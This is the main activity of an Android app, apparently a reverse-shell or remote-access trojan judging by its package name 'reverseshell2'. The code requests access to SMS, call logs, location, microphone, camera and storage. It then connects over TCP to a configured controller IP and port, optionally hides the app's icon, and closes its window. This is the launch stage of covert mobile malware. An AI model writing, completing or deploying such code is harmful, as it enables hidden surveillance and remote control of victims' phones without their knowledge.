package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;

    private static final int PERMISSION_REQUEST_CODE = 100;
    String[] permissions = {
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        overridePendingTransition(0, 0);
        context = getApplicationContext();
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
            if (!hasPermissions(context, permissions)) {
                androidx.core.app.ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            } else {
                startApp();
            }
        } else {
            startApp();
        }
    }

    private boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (androidx.core.app.ActivityCompat.checkSelfPermission(context, permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @androidx.annotation.NonNull String[] permissions, @androidx.annotation.NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            startApp();
        }
    }

    private void startApp() {
        Log.d(TAG, config.IP + "\t" + config.port);
        new tcpConnection(activity, context).execute(config.IP, config.port);
        if (config.icon) {
            new functions(activity).hideAppIcon(context);
        }
        finish();
    }
}
